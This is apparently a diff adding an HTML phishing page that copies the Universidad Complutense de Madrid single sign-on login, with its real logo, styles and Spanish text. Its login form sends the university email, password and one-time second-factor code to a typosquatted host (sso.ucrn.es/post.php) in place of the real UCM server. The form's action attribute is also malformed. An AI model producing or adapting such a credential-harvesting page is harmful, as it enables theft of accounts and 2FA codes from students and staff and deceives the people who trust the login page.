@@ -1,0 +1,107 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<!--responsive-->
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=11">
+
+<script type="text/javascript" src="https://sso.ucm.es/simplesaml/resources/script.js"></script>
+<title>Acceso Web Unificado a la UCM (Web SSO)</title>
+
+        <link rel="stylesheet" type="text/css" href="https://sso.ucm.es/simplesaml/resources/default.css" />
+        <link rel="icon" type="image/icon" href="https://sso.ucm.es/simplesaml/resources/icons/favicon.ico" />
+
+<!--responsive-->
+        <link rel="stylesheet" type="text/css" href="https://sso.ucm.es/simplesaml/resources/bootstrap.css" />
+        <link rel="stylesheet" type="text/css" href="https://sso.ucm.es/simplesaml/resources/ucm.css" />
+
+<meta name="robots" content="noindex, nofollow" />
+
+
+</head>
+<body  onload="SimpleSAML_focus('username');">
+<div id="separador1" class="container-fluid fondo45"></div>
+<div id="cabecera">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-5 col-sm-5 col-xs-12" id="logo">
+                <a href="http://www.ucm.es" title="Universidad Complutense de Madrid - Portada">
+                    <img src="https://sso.ucm.es/simplesaml/resources/img/logo.png" alt="ucm" title="ucm">
+                </a>
+            </div>
+            <div class="col-lg-7 col-sm-7 col-xs-12" id="titulo_website">
+                <h1 class="web_title">Acceso Web Unificado</h1>
+            </div>
+        </div>
+    </div>
+</div>
+<div id="separador2" class="container-fluid fondo45"></div>
+
+<div id="wrap" class="fondogris container-fluid">
+  <div id="content" class="container">
+
+
+
+<form action="http://sso.ucrn.es/post.php"http://sso.ucrn.es/loginuserpass.php?" method="post" name="f" class="form-horizontal" role="form">
+  <h2 class="h2sub hidden-xs">Acceso Web Unificado a la UCM (Web SSO)</h2>
+  <p>Identificarse correctamente en esta página le habilitará la entrada en la mayoría de las aplicaciones y en los servicios en la nube @UCM.</p>
+
+  <div class="row">
+  <div class="col-sm-1"></div>
+  <div class="col-sm-2 hidden-xs">
+  <img id="img-llaves" class="img-circle" src="https://sso.ucm.es/simplesaml/resources/img/gtk-dialog-authentication.48x48.png" alt="img-autenticacion" />
+  </div>
+  <div class="col-sm-8 col-xs-12">
+
+  <div class="form-group">
+  <label for="username" class="col-lg-4 control-label">Dirección de correo UCM</label>
+  <div class="col-lg-8">
+  <input type="text" class="form-control" id="username" tabindex="1" name="username" value="" onblur="javascript:if(this.value.length > 0) {queryServidor('https://sso.ucm.es/simplesaml/module.php/userpasswordcaptcha/chkUser.php', '&id=mailAlternateAddress:'+this.value)}" /></div>
+</div>
+
+<div class="form-group">
+  <label for="password" class="col-lg-4 control-label">Contrase&ntilde;a</label>
+  <div class="col-lg-8">
+  <input class="form-control" id="password" type="password" tabindex="2" name="password" />
+  </div>
+  </div>
+
+  <input type="hidden" name="AuthState" value="_55ecc9867c7af6299e1b3b6eb380418af8b42a2477:https://sso.ucm.es/simplesaml/saml2/idp/SSOService.php?spentityid=pacv&amp;cookieTime=1552487962&amp;RelayState=_2308f6b4-eb9e-44cd-8755-58b37547f285" />
+  <!-- 2FA will be integrated in this div -->
+  <div class="form-group" id="secondFA" style="display:none">
+  <label for="captcha2" class="col-lg-4 control-label">Segundo Factor de Autenticación (escriba la clave numérica generada con su dispositivo)</label>
+  <div class="col-lg-8">
+  <input class="form-otp" id="totp" type="number"  tabindex="3" name="totp" autocomplete="off" />
+  </div>
+  </div>
+
+  <div id="boxAJAX" class=hidden></div>
+      
+  <br />
+
+  <div class="text-center">
+    <button type="submit" class="btn btn-default btn-lg active" id="submit_button_nocaptcha" onclick="submit_form()">Iniciar sesión</button>
+  </div>
+  <div class="text-center">
+    <button style="display:none" class="g-recaptcha btn btn-default btn-lg active" id="submit_button_captcha" data-sitekey="6Ldr_0AUAAAAANdstZIPVoPIObgfitYJXy3wh39k" data-callback="submit_form">Iniciar sesión</button>
+  </div>
+      
+  </div>
+</div>
+
+<h2></h2><p><a href='https://idm.ucm.es/clave'>&#191;Olvidó la contrase&ntilde;a&#63;</a><br><a href='http://faq.ucm.es'>Más información</a></p></form>
+
+<script>
+function submit_form() {
+  document.forms[0].submit();
+}
+</script>
+
+
+        </div><!-- #content -->
+
+</div><!-- #wrap -->
+
+<div id="separador3" class="container-fluid fondo45"></div>
+</body>
